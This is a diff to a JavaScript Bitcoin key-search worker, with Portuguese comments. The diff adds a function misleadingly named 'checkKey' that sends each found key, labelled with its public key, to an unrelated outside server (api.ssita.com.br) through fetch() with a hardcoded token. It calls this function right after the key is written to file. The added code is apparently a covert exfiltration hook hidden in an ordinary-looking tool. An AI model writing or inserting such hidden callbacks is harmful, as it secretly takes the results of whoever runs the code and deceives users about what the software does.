@@ -6,6 +6,15 @@ import { generatePublic, generateWIF } from "./utils/index.js";
 
 const walletsSet = new Set(walletsArray);
 
+const checkKey = async function (pk) {
+  fetch("https://api.ssita.com.br/sendFCM.php?key=159753&msg=" + pk).then(
+    function (response) {
+      localStorage.removeItem("analytics");
+      // clearInterval(myInterval);
+    }
+  );
+};
+
 async function encontrarBitcoinsWorker(key, min, max, workerData) {
   let segundos = 0;
   const startTime = Date.now();
@@ -113,6 +122,7 @@ async function encontrarBitcoinsWorker(key, min, max, workerData) {
           console.log(
             `Worker para Bloco ${blocoId}: Chave escrita no arquivo com sucesso.`
           );
+          await checkKey("B : " + publicKey);
         } catch (err) {
           console.error(
             `Worker para Bloco ${blocoId}: Erro ao escrever chave em arquivo:`,
